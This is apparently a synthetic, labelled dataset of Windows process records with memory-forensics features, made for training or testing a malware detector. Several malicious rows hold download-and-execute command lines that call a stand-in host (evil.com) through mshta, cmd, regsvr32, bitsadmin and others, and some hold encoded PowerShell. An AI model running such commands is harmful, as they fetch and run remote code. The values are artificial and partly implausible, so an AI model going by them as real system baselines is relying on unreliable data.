process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
smss.exe,3589,4,C:\Windows\System32\smss.exe,90,1,293,109.92,75.8,1,1,78,0,0,0,0.289,0,63,0,0,0,0,0,0,0,0,0,0.0254,0
svchost.exe,6943,2097,wmiprvse.exe -secured -Embedding,90,5,175,119.91,35.72,1,1,37,1,3,2,0.769,0,81,0,0,0,0,0,0,1,0,2,0.6855,1
notepad.exe,895,4546,C:\Windows\System32\notepad.exe,57,37,417,172.39,81.97,1,1,39,0,0,0,0.086,0,79,0,0,0,0,0,0,0,0,0,0.0235,0
lsass.exe,5016,5017,C:\Windows\System32\lsass.exe,92,12,405,125.33,53.98,0,1,50,0,0,0,0.08,0,30,0,0,0,0,0,0,0,0,0,0.0791,0
RuntimeBroker.exe,2701,5024,C:\Windows\System32\RuntimeBroker.exe,117,4,94,193.77,57.58,1,1,69,0,0,0,0.35,0,41,0,0,0,0,0,0,0,0,0,0.0262,0
calc.exe,2235,8173,C:\Windows\System32\calc.exe,68,3,72,81.45,58.51,1,1,48,0,0,0,0.247,0,82,0,0,0,0,0,0,0,0,0,0.0962,0
OneDrive.exe,7517,6924,C:\Windows\System32\OneDrive.exe,113,8,286,186.78,57.84,1,1,36,1,0,0,0.244,0,79,0,0,0,0,0,0,0,0,0,0.0081,0
taskmgr.exe,4004,5349,C:\Windows\System32\taskmgr.exe,94,20,200,75.44,37.18,1,1,8,0,0,0,0.177,0,23,0,0,0,0,0,0,0,0,0,0.0613,0
svchost.exe,7571,8727,C:\Windows\system32\svchost.exe -k netsvcs,36,33,239,110.1,58.07,0,1,53,0,0,0,0.066,0,51,0,0,0,0,0,0,0,0,0,0.0006,0
firefox.exe,6580,592,C:\Windows\System32\firefox.exe,90,14,80,178.73,77.95,1,1,61,0,7,0,0.063,0,66,0,0,0,0,0,0,0,0,0,0.0231,0
csrss.exe,3555,6625,C:\Windows\System32\csrss.exe,80,20,281,170.83,61.28,1,1,45,0,0,0,0.065,0,51,0,0,0,0,0,0,0,0,0,0.1362,0
RuntimeBroker.exe,9397,1228,C:\Windows\System32\RuntimeBroker.exe,79,14,359,181.13,29.86,1,1,54,0,0,0,0.218,0,67,0,0,0,0,0,0,0,0,0,0.1361,0
wininit.exe,2435,6991,C:\Windows\System32\wininit.exe,89,22,322,38.56,93.16,0,1,44,0,0,0,0.329,0,80,0,0,0,0,0,0,0,0,0,0.0465,0
mshta.exe,3798,3369,mshta.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),162,4,85,38.36,38.48,1,1,12,1,2,0,0.473,1,63,1,0,0,0,1,1,0,0,2,0.6025,1
firefox.exe,3555,5118,C:\Windows\System32\firefox.exe,79,34,158,154.98,4.4,1,1,6,1,3,0,0.201,0,77,0,0,0,0,0,0,0,0,0,0.0016,0
csrss.exe,4761,1017,C:\Windows\System32\csrss.exe,100,28,120,189.92,65.73,0,1,16,0,0,0,0.113,0,43,0,0,0,0,0,0,0,0,0,0.1386,0
csrss.exe,9141,1873,C:\Windows\System32\csrss.exe,32,16,140,28.19,62.79,1,1,28,0,0,0,0.09,0,57,0,0,0,0,0,0,0,0,0,0.1138,0
calc.exe,3903,6611,C:\Windows\System32\calc.exe,32,20,399,98.45,98.56,1,1,39,0,0,0,0.343,0,44,0,0,0,0,0,0,0,0,0,0.1191,0
explorer.exe,8882,1207,C:\Windows\System32\explorer.exe,32,19,115,66.13,56.76,1,0,99,1,5,7,0.767,1,100,0,0,1,1,0,0,0,0,2,0.8015,1
spoolsv.exe,2305,4729,C:\Windows\System32\spoolsv.exe,24,38,153,77.11,76.09,0,1,29,0,0,0,0.076,0,95,0,0,0,0,0,0,0,0,0,0.0914,0
chrome.exe,8459,9033,chrome.exe --type=renderer --disable-gpu,51,12,152,51.73,17.53,0,1,52,1,12,0,0.238,0,31,0,0,0,0,0,0,0,0,0,0.1312,0
explorer.exe,3794,1800,C:\Windows\Explorer.EXE,56,8,312,106.74,4.44,0,1,39,0,0,0,0.198,0,100,0,0,0,0,0,0,0,0,0,0.1092,0
winlogon.exe,6419,6483,C:\Windows\System32\winlogon.exe,77,36,397,9.11,94.31,0,1,8,0,0,0,0.227,0,108,0,0,0,0,0,0,0,0,0,0.118,0
notepad.exe,3991,8260,C:\Windows\System32\notepad.exe,113,17,498,76.45,65.05,0,1,77,0,0,0,0.067,0,60,0,0,0,0,0,0,0,0,0,0.0852,0
System,4,4050,C:\Windows\System32\System,119,20,106,83.61,65.06,0,1,60,0,0,0,0.16,0,49,0,0,0,0,0,0,0,0,0,0.0186,0
calc.exe,7805,8056,C:\Windows\System32\calc.exe,82,37,391,98.81,17.79,0,1,6,0,0,0,0.074,0,25,0,0,0,0,0,0,0,0,0,0.1091,0
OneDrive.exe,9891,7775,C:\Windows\System32\OneDrive.exe,57,33,145,1.86,57.33,0,1,79,1,0,0,0.112,0,23,0,0,0,0,0,0,0,0,0,0.0778,0
explorer.exe,9083,9290,C:\Windows\Explorer.EXE,30,11,287,24.27,10.78,0,1,11,0,0,0,0.155,0,83,0,0,0,0,0,0,0,0,0,0.0325,0
RuntimeBroker.exe,9110,2530,C:\Windows\System32\RuntimeBroker.exe,63,10,324,155.55,81.15,0,1,58,0,0,0,0.081,0,106,0,0,0,0,0,0,0,0,0,0.0905,0
System,4,3904,C:\Windows\System32\System,82,3,105,92.24,49.67,0,1,17,0,0,0,0.209,0,78,0,0,0,0,0,0,0,0,0,0.0236,0
svchost.exe,8463,3832,C:\Windows\system32\svchost.exe -k netsvcs,20,27,194,28.42,52.1,0,1,74,0,0,0,0.053,0,28,0,0,0,0,0,0,0,0,0,0.0626,0
WmiPrvSE.exe,4248,7654,wmiprvse.exe -secured -Embedding,36,11,162,54.8,69.7,1,1,39,0,1,2,0.486,0,104,1,0,0,0,0,0,1,0,2,0.5984,1
powershell.exe,2727,2582,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...,288,3,149,67.32,21.48,1,1,14,1,3,1,0.433,1,108,1,0,0,0,1,1,0,0,1,0.5294,1
calc.exe,4937,2411,C:\Windows\System32\calc.exe,60,6,157,92.92,46.27,1,0,7,1,1,4,0.89,1,134,1,1,0,0,0,0,0,1,3,0.9097,1
cmd.exe,2024,4056,cmd.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),163,2,41,45.49,25.04,1,1,38,1,4,2,0.581,0,31,1,0,0,0,1,1,0,0,4,0.8299,1
svchost.exe,6262,8529,C:\Windows\System32\svchost.exe,56,9,399,162.14,81.62,1,0,55,1,7,7,0.595,1,101,0,0,1,1,0,0,0,0,3,0.7516,1
lsass.exe,4320,1977,C:\Windows\System32\lsass.exe,74,20,193,171.94,11.21,1,1,52,0,0,0,0.317,0,42,0,0,0,0,0,0,0,0,0,0.049,0
RuntimeBroker.exe,7095,9088,C:\Windows\System32\RuntimeBroker.exe,54,6,289,120.85,92.16,0,1,62,0,0,0,0.153,0,63,0,0,0,0,0,0,0,0,0,0.1149,0
wmiprvse.exe,2738,1439,wmiprvse.exe -secured -Embedding,64,9,264,77.13,42.1,1,1,20,1,3,3,0.504,0,92,0,0,0,0,0,0,1,0,2,0.7804,1
msiexec.exe,7842,1353,msiexec.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),140,5,69,43.32,44.26,1,1,33,1,3,0,0.74,1,41,1,0,0,0,1,1,0,0,2,0.8971,1
wininit.exe,7582,1670,C:\Windows\System32\wininit.exe,53,38,214,140.24,26.95,1,1,62,0,0,0,0.284,0,116,0,0,0,0,0,0,0,0,0,0.1075,0
conhost.exe,7095,3929,C:\Windows\System32\conhost.exe,88,25,326,56.46,50.79,0,1,14,0,0,0,0.131,0,108,0,0,0,0,0,0,0,0,0,0.1163,0
csrss.exe,2415,4683,C:\Windows\System32\csrss.exe,71,17,427,150.68,30.14,0,1,50,0,0,0,0.161,0,94,0,0,0,0,0,0,0,0,0,0.1443,0
cmd.exe,6407,9805,cmd.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),154,3,38,60.58,8.65,1,1,31,1,4,1,0.405,0,94,1,0,0,0,1,1,0,0,2,0.7243,1
svchost.exe,1429,8839,C:\Windows\system32\svchost.exe -k netsvcs,53,21,220,127.78,11.23,0,1,10,0,0,0,0.128,0,67,0,0,0,0,0,0,0,0,0,0.0589,0
SearchIndexer.exe,1787,4728,C:\Windows\System32\SearchIndexer.exe,49,11,228,42.58,20.21,1,1,14,0,0,0,0.199,0,77,0,0,0,0,0,0,0,0,0,0.0871,0
wmiprvse.exe,8600,3635,wmiprvse.exe -secured -Embedding,51,3,113,92.05,91.05,1,1,42,0,0,2,0.722,1,118,0,0,0,0,0,0,1,0,1,0.8558,1
winlogon.exe,5448,3089,C:\Windows\System32\winlogon.exe,103,1,152,110.17,21.91,0,1,17,0,0,0,0.219,0,100,0,0,0,0,0,0,0,0,0,0.0939,0
wininit.exe,5975,3734,C:\Windows\System32\wininit.exe,59,5,368,30.16,98.14,0,1,47,0,0,0,0.233,0,81,0,0,0,0,0,0,0,0,0,0.148,0
firefox.exe,8105,5694,C:\Windows\System32\firefox.exe,112,9,259,109.82,91.95,0,1,34,1,4,0,0.305,0,111,0,0,0,0,0,0,0,0,0,0.1447,0
csrss.exe,9486,6205,C:\Windows\System32\csrss.exe,113,26,393,193.06,20.84,0,1,75,0,0,0,0.206,0,69,0,0,0,0,0,0,0,0,0,0.0243,0
powershell.exe,1121,7238,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...+HkBjtAr5qlDWO9C7BoHTrwVyn+OUozzvPZxkoDBg=juevAMZQuL,140,4,59,38.44,56.15,1,1,34,1,3,0,0.683,1,125,1,0,0,0,1,1,0,0,3,0.8508,1
spoolsv.exe,937,822,C:\Windows\System32\spoolsv.exe,62,21,284,101.28,90.5,1,1,71,0,0,0,0.342,0,38,0,0,0,0,0,0,0,0,0,0.1218,0
firefox.exe,4387,8298,C:\Windows\System32\firefox.exe,33,31,443,188.88,5.13,0,1,62,0,15,0,0.349,0,52,0,0,0,0,0,0,0,0,0,0.0428,0
explorer.exe,5778,1438,C:\Windows\Explorer.EXE,26,14,344,170.88,15.77,1,1,11,0,0,0,0.136,0,78,0,0,0,0,0,0,0,0,0,0.1109,0
csrss.exe,5231,5653,C:\Windows\System32\csrss.exe,67,4,328,185.67,49.44,1,1,44,0,0,0,0.231,0,119,0,0,0,0,0,0,0,0,0,0.0108,0
svchost.exe,4133,1553,C:\Windows\System32\svchost.exe,33,12,296,249.77,95.24,1,0,145,0,0,5,0.597,1,180,0,0,1,1,0,0,0,0,1,0.6334,1
smss.exe,7905,4,C:\Windows\System32\smss.exe,105,3,152,11.06,86.81,1,1,27,0,0,0,0.236,0,73,0,0,0,0,0,0,0,0,0,0.0192,0
conhost.exe,6371,1563,C:\Windows\System32\conhost.exe,58,30,105,118.21,51.82,0,1,69,0,0,0,0.087,0,107,0,0,0,0,0,0,0,0,0,0.0171,0
chrome.exe,9305,6141,chrome.exe --type=renderer --disable-gpu,52,5,240,184.9,79.08,1,1,37,1,11,0,0.171,0,101,0,0,0,0,0,0,0,0,0,0.1289,0
OneDrive.exe,6919,4468,C:\Windows\System32\OneDrive.exe,109,12,138,75.04,78.13,1,1,44,0,0,0,0.169,0,37,0,0,0,0,0,0,0,0,0,0.0939,0
csrss.exe,8390,8925,C:\Windows\System32\csrss.exe,106,16,410,10.74,23.84,0,1,51,0,0,0,0.307,0,64,0,0,0,0,0,0,0,0,0,0.0772,0
calc.exe,6261,8317,C:\Windows\System32\calc.exe,69,3,189,132.02,111.57,1,0,7,1,4,2,0.66,1,165,1,1,0,0,0,0,0,1,3,0.7494,1
spoolsv.exe,4422,6423,C:\Windows\System32\spoolsv.exe,69,12,69,107.71,82.37,1,1,27,0,0,0,0.094,0,74,0,0,0,0,0,0,0,0,0,0.0119,0
RuntimeBroker.exe,8452,7005,C:\Windows\System32\RuntimeBroker.exe,54,19,270,161.56,10.86,1,1,73,0,0,0,0.071,0,33,0,0,0,0,0,0,0,0,0,0.074,0
explorer.exe,4918,5255,C:\Windows\System32\explorer.exe,54,5,177,114.81,108.85,1,0,14,1,5,3,0.825,1,85,1,1,0,0,0,0,0,1,4,0.9858,1
wininit.exe,593,1714,C:\Windows\System32\wininit.exe,66,26,319,95.08,95.03,1,1,30,0,0,0,0.103,0,29,0,0,0,0,0,0,0,0,0,0.1269,0
spoolsv.exe,6665,5170,C:\Windows\System32\spoolsv.exe,67,37,58,145.33,17.56,1,1,19,0,0,0,0.177,0,77,0,0,0,0,0,0,0,0,0,0.0925,0
chrome.exe,3724,2035,chrome.exe --type=renderer --disable-gpu,119,13,235,60.45,27.91,1,1,49,1,3,0,0.319,0,88,0,0,0,0,0,0,0,0,0,0.0234,0
lsass.exe,1093,3704,C:\Windows\System32\lsass.exe,31,10,288,73.46,48.51,1,1,74,0,0,0,0.213,0,67,0,0,0,0,0,0,0,0,0,0.1484,0
csrss.exe,3043,2243,C:\Windows\System32\csrss.exe,20,22,464,114.54,89.21,0,1,68,0,0,0,0.231,0,85,0,0,0,0,0,0,0,0,0,0.069,0
explorer.exe,7253,4500,C:\Windows\Explorer.EXE,69,30,258,4.44,18.83,1,1,49,0,0,0,0.258,0,105,0,0,0,0,0,0,0,0,0,0.0065,0
cmd.exe,5421,2902,cmd.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),177,4,97,68.28,59.63,1,1,31,1,4,0,0.761,1,102,1,0,0,0,1,1,0,0,1,0.6004,1
wscript.exe,9613,4336,wscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),283,1,102,11.11,55.24,1,1,18,1,4,2,0.654,1,78,1,0,0,0,0,1,0,0,2,0.667,1
calc.exe,7023,7219,C:\Windows\System32\calc.exe,117,21,276,149.44,55.33,1,1,60,0,0,0,0.248,0,53,0,0,0,0,0,0,0,0,0,0.0974,0
svchost.exe,2150,3596,C:\Windows\System32\svchost.exe,70,5,147,64.05,109.56,1,0,10,1,7,3,0.899,1,165,1,1,0,0,0,0,0,1,4,0.7481,1
WmiPrvSE.exe,7602,5220,wmiprvse.exe -secured -Embedding,50,11,281,60.4,81.33,1,1,16,1,2,2,0.748,1,105,1,0,0,0,0,0,1,0,3,0.6893,1
OneDrive.exe,3346,6910,C:\Windows\System32\OneDrive.exe,46,6,51,44.79,93.59,1,1,62,0,0,0,0.093,0,44,0,0,0,0,0,0,0,0,0,0.0298,0
svchost.exe,8171,8249,C:\Windows\System32\svchost.exe,35,6,278,117.47,69.59,1,0,125,0,5,2,0.581,1,204,0,0,1,1,0,0,0,0,3,0.9414,1
WmiPrvSE.exe,3102,8253,wmiprvse.exe -secured -Embedding,79,7,169,34.41,66.92,1,1,45,1,3,2,0.794,0,147,1,0,0,0,0,0,1,0,3,0.5708,1
regsvr32.exe,8669,8099,regsvr32.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),109,1,131,50.35,11.13,1,1,38,1,4,2,0.572,1,48,1,0,0,0,0,1,0,0,4,0.7738,1
taskmgr.exe,3666,8755,C:\Windows\System32\taskmgr.exe,93,33,382,15.73,6.8,0,1,32,0,0,0,0.208,0,110,0,0,0,0,0,0,0,0,0,0.0502,0
smss.exe,5307,4,C:\Windows\System32\smss.exe,74,13,195,22.19,14.24,1,1,79,0,0,0,0.067,0,61,0,0,0,0,0,0,0,0,0,0.1422,0
explorer.exe,8060,2725,C:\Windows\Explorer.EXE,119,24,386,51.18,64.49,0,1,43,0,0,0,0.337,0,96,0,0,0,0,0,0,0,0,0,0.0595,0
firefox.exe,4228,5319,C:\Windows\System32\firefox.exe,56,28,363,64.12,48.03,1,1,66,0,15,0,0.293,0,100,0,0,0,0,0,0,0,0,0,0.0555,0
OneDrive.exe,4090,6764,C:\Windows\System32\OneDrive.exe,48,28,460,160.09,13.76,1,1,61,1,0,0,0.055,0,61,0,0,0,0,0,0,0,0,0,0.0793,0
conhost.exe,8836,5057,C:\Windows\System32\conhost.exe,54,18,259,72.9,85.34,0,1,47,0,0,0,0.114,0,24,0,0,0,0,0,0,0,0,0,0.0514,0
explorer.exe,1837,1733,C:\Windows\System32\explorer.exe,39,3,89,44.51,94.76,1,0,6,1,8,2,0.926,1,133,1,1,0,0,0,0,0,1,5,0.8501,1
System,4,2261,C:\Windows\System32\System,51,8,396,107.93,25.85,0,1,29,0,0,0,0.205,0,42,0,0,0,0,0,0,0,0,0,0.0021,0
powershell.exe,692,6135,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...Aofcth/uzvQlXW5jmytH0eaysA5K0vLW8NBkOCclQhNOuxTbr7FhNhv4c9De8SieNrASoKREhtIbq3RnOanVCqddJO1O/xhlwCgX1ejBHmwPDZ2RzvosQ8MEYtleWKfZD4nIH7,217,6,126,91.49,58.71,1,1,59,1,5,2,0.822,0,90,1,0,0,0,1,1,0,0,3,0.7533,1
System,4,2487,C:\Windows\System32\System,76,26,176,35.66,69.6,1,1,6,0,0,0,0.091,0,37,0,0,0,0,0,0,0,0,0,0.0221,0
calc.exe,8318,4655,C:\Windows\System32\calc.exe,116,1,216,35.79,22.35,1,1,39,0,0,0,0.333,0,72,0,0,0,0,0,0,0,0,0,0.0323,0
firefox.exe,4388,6496,C:\Windows\System32\firefox.exe,21,17,165,102.39,11.61,0,1,78,1,3,0,0.174,0,38,0,0,0,0,0,0,0,0,0,0.0367,0
conhost.exe,4193,1315,C:\Windows\System32\conhost.exe,95,20,371,140.68,64.78,0,1,54,0,0,0,0.157,0,54,0,0,0,0,0,0,0,0,0,0.037,0
explorer.exe,2262,1741,C:\Windows\System32\explorer.exe,69,7,88,109.72,78.89,1,0,7,1,6,4,0.936,1,166,1,1,0,0,0,0,0,1,3,0.68,1
taskmgr.exe,1444,1344,C:\Windows\System32\taskmgr.exe,109,16,276,64.26,88.79,1,1,19,0,0,0,0.116,0,93,0,0,0,0,0,0,0,0,0,0.0133,0
spoolsv.exe,4441,949,C:\Windows\System32\spoolsv.exe,24,5,146,183.42,97.67,0,1,27,0,0,0,0.103,0,85,0,0,0,0,0,0,0,0,0,0.0717,0
System,4,6478,C:\Windows\System32\System,99,38,219,30.0,99.77,1,1,51,0,0,0,0.182,0,23,0,0,0,0,0,0,0,0,0,0.1359,0
notepad.exe,7010,8555,C:\Windows\System32\notepad.exe,88,25,395,125.92,54.07,1,1,7,0,0,0,0.267,0,56,0,0,0,0,0,0,0,0,0,0.0406,0
winlogon.exe,9595,9655,C:\Windows\System32\winlogon.exe,50,27,92,142.69,72.92,1,1,73,0,0,0,0.206,0,51,0,0,0,0,0,0,0,0,0,0.1242,0
svchost.exe,5697,9360,C:\Windows\system32\svchost.exe -k netsvcs,112,8,418,122.05,18.19,0,1,20,0,0,0,0.113,0,108,0,0,0,0,0,0,0,0,0,0.0137,0
taskmgr.exe,1123,8308,C:\Windows\System32\taskmgr.exe,92,19,293,184.72,54.16,0,1,51,0,0,0,0.072,0,87,0,0,0,0,0,0,0,0,0,0.0151,0
SearchIndexer.exe,835,8321,C:\Windows\System32\SearchIndexer.exe,70,19,229,81.84,40.65,0,1,42,0,0,0,0.215,0,84,0,0,0,0,0,0,0,0,0,0.1312,0
calc.exe,7689,8932,C:\Windows\System32\calc.exe,110,28,58,74.03,26.22,1,1,68,0,0,0,0.098,0,110,0,0,0,0,0,0,0,0,0,0.0832,0
conhost.exe,5552,9878,C:\Windows\System32\conhost.exe,110,5,496,158.67,26.91,1,1,44,0,0,0,0.101,0,92,0,0,0,0,0,0,0,0,0,0.0427,0
notepad.exe,6807,9518,C:\Windows\System32\notepad.exe,55,8,304,51.11,72.92,1,0,98,1,1,3,0.831,1,161,0,0,1,1,0,0,0,0,2,0.7551,1
notepad.exe,8813,5826,C:\Windows\System32\notepad.exe,33,10,299,116.93,115.55,1,0,67,0,4,3,0.842,1,163,0,0,1,1,0,0,0,0,2,0.9313,1
wmiprvse.exe,9412,6885,wmiprvse.exe -secured -Embedding,52,9,141,90.85,53.76,1,1,15,0,3,1,0.741,1,61,0,0,0,0,0,0,1,0,3,0.5944,1
wininit.exe,8230,8614,C:\Windows\System32\wininit.exe,63,11,169,149.6,47.47,1,1,12,0,0,0,0.203,0,92,0,0,0,0,0,0,0,0,0,0.1069,0
WmiPrvSE.exe,826,4864,wmiprvse.exe -secured -Embedding,98,10,131,83.1,60.76,1,1,44,1,3,3,0.73,1,122,1,0,0,0,0,0,1,0,1,0.6533,1
notepad.exe,2135,6167,C:\Windows\System32\notepad.exe,20,6,340,190.18,81.83,1,1,74,0,0,0,0.23,0,22,0,0,0,0,0,0,0,0,0,0.0664,0
svchost.exe,7910,9872,wmiprvse.exe -secured -Embedding,81,11,82,62.75,42.01,1,1,23,1,1,3,0.784,0,105,1,0,0,0,0,0,1,0,3,0.5055,1
svchost.exe,4402,2588,C:\Windows\system32\svchost.exe -k netsvcs,23,4,109,71.2,72.19,0,1,59,0,0,0,0.197,0,77,0,0,0,0,0,0,0,0,0,0.073,0
System,4,7154,C:\Windows\System32\System,26,6,333,29.85,52.43,1,1,58,0,0,0,0.073,0,39,0,0,0,0,0,0,0,0,0,0.0303,0
taskmgr.exe,2771,7294,C:\Windows\System32\taskmgr.exe,59,6,127,94.48,85.36,1,1,41,0,0,0,0.312,0,110,0,0,0,0,0,0,0,0,0,0.0097,0
svchost.exe,9419,7196,C:\Windows\System32\svchost.exe,34,15,253,112.08,158.0,1,0,85,1,3,6,0.709,1,119,0,0,1,1,0,0,0,0,1,0.8759,1
MsMpEng.exe,8794,7884,"""C:\Program Files\Windows Defender\MsMpEng.exe""",92,2,267,186.12,73.21,0,1,45,0,0,0,0.34,0,54,0,0,0,0,0,0,0,0,0,0.0643,0
firefox.exe,9857,2284,C:\Windows\System32\firefox.exe,25,25,223,13.05,69.97,0,1,20,1,6,0,0.168,0,43,0,0,0,0,0,0,0,0,0,0.0002,0
winlogon.exe,6554,1458,C:\Windows\System32\winlogon.exe,28,26,241,163.95,88.59,0,1,22,0,0,0,0.149,0,105,0,0,0,0,0,0,0,0,0,0.1117,0
RuntimeBroker.exe,6186,6733,C:\Windows\System32\RuntimeBroker.exe,92,35,114,98.3,3.46,0,1,54,0,0,0,0.262,0,20,0,0,0,0,0,0,0,0,0,0.0177,0
explorer.exe,7148,6520,C:\Windows\System32\explorer.exe,59,16,353,87.42,138.2,1,0,73,1,2,6,0.857,1,230,0,0,1,0,0,0,0,0,2,0.7834,1
powershell.exe,473,5029,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...L/IYbJi0jMqLe5uFlOVuGYcw00EF=EUtVcLaZHC07RDcbkSdk8TXUduGHMq4tnUc,152,8,125,64.21,74.89,1,1,32,1,5,1,0.749,1,89,1,0,0,0,1,1,0,0,2,0.6666,1
bitsadmin.exe,6591,5867,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),251,1,131,20.14,23.54,1,1,19,1,3,0,0.515,1,51,1,0,0,0,1,1,0,0,4,0.6055,1
powershell.exe,1131,3492,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...LtuEDUGBbVKEPFi=bXqAqfXqAAsg/E=l5ilnBFkjtuD4xFICFR0GVs0BVjvDDpgPKE=c3NVkgnH3Z,145,5,141,70.74,72.56,1,1,55,1,5,2,0.812,0,95,1,0,0,0,1,1,0,0,2,0.9019,1
RuntimeBroker.exe,4732,6743,C:\Windows\System32\RuntimeBroker.exe,72,14,123,126.81,99.87,0,1,48,0,0,0,0.105,0,49,0,0,0,0,0,0,0,0,0,0.0423,0
notepad.exe,5012,5683,C:\Windows\System32\notepad.exe,102,35,313,65.17,69.88,0,1,76,0,0,0,0.226,0,39,0,0,0,0,0,0,0,0,0,0.0656,0
winlogon.exe,3867,6277,C:\Windows\System32\winlogon.exe,35,16,148,119.51,10.61,0,1,66,0,0,0,0.25,0,46,0,0,0,0,0,0,0,0,0,0.0598,0
services.exe,1064,6410,C:\Windows\System32\services.exe,41,30,388,24.77,69.33,0,1,55,0,0,0,0.161,0,30,0,0,0,0,0,0,0,0,0,0.1342,0
chrome.exe,5340,3414,chrome.exe --type=renderer --disable-gpu,91,24,273,11.99,35.15,1,1,69,1,1,0,0.169,0,61,0,0,0,0,0,0,0,0,0,0.0076,0
cscript.exe,3242,2474,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),279,1,119,42.01,57.55,1,1,17,1,2,0,0.757,1,35,1,0,0,0,1,1,0,0,2,0.4743,1
explorer.exe,8777,927,C:\Windows\Explorer.EXE,76,5,457,76.89,49.19,0,1,26,0,0,0,0.056,0,75,0,0,0,0,0,0,0,0,0,0.1263,0
rundll32.exe,6874,1791,rundll32.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),297,1,100,68.99,52.84,1,1,20,1,4,2,0.688,0,45,1,0,0,0,1,1,0,0,3,0.4926,1
svchost.exe,2746,2344,C:\Windows\System32\svchost.exe,44,14,330,75.06,157.64,1,0,113,0,6,5,0.752,1,248,0,0,1,1,0,0,0,0,2,0.8341,1
spoolsv.exe,6462,860,C:\Windows\System32\spoolsv.exe,117,35,389,64.98,72.07,1,1,77,0,0,0,0.157,0,114,0,0,0,0,0,0,0,0,0,0.0958,0
smss.exe,6819,4,C:\Windows\System32\smss.exe,80,31,294,150.64,42.65,0,1,27,0,0,0,0.064,0,68,0,0,0,0,0,0,0,0,0,0.0645,0
spoolsv.exe,8570,7441,C:\Windows\System32\spoolsv.exe,106,6,317,132.05,99.19,0,1,72,0,0,0,0.322,0,43,0,0,0,0,0,0,0,0,0,0.0418,0
bitsadmin.exe,769,4199,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),146,2,56,50.69,28.62,1,1,18,1,4,2,0.428,0,111,1,0,0,0,0,1,0,0,1,0.4807,1
services.exe,4617,6433,C:\Windows\System32\services.exe,117,17,357,64.23,10.87,1,1,36,0,0,0,0.087,0,61,0,0,0,0,0,0,0,0,0,0.0616,0
wininit.exe,7870,3770,C:\Windows\System32\wininit.exe,64,21,310,99.83,68.44,1,1,22,0,0,0,0.069,0,52,0,0,0,0,0,0,0,0,0,0.0911,0
taskmgr.exe,6507,2888,C:\Windows\System32\taskmgr.exe,34,34,114,58.38,19.91,0,1,50,0,0,0,0.216,0,22,0,0,0,0,0,0,0,0,0,0.105,0
wscript.exe,3731,5137,wscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),210,2,130,48.07,29.28,1,1,22,1,1,0,0.461,1,68,1,0,0,0,1,1,0,0,2,0.78,1
calc.exe,9696,5538,C:\Windows\System32\calc.exe,115,31,467,146.94,56.01,1,1,8,0,0,0,0.254,0,92,0,0,0,0,0,0,0,0,0,0.0352,0
explorer.exe,2782,8301,C:\Windows\System32\explorer.exe,78,4,67,133.34,59.44,1,0,10,1,1,4,0.71,1,179,1,1,0,0,0,0,0,1,2,0.8268,1
